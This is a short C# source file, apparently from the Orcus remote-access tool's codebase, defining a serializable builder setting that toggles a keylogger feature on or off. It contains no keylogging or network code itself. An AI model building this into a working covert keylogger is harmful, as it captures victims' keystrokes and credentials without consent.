using System;
using Orcus.Shared.Core;

namespace Orcus.Shared.Settings
{
    [Serializable]
    public class KeyloggerBuilderProperty : IBuilderProperty
    {
        public bool IsEnabled { get; set; }

        public IBuilderProperty Clone()
        {
            return new KeyloggerBuilderProperty {IsEnabled = IsEnabled};
        }
    }
}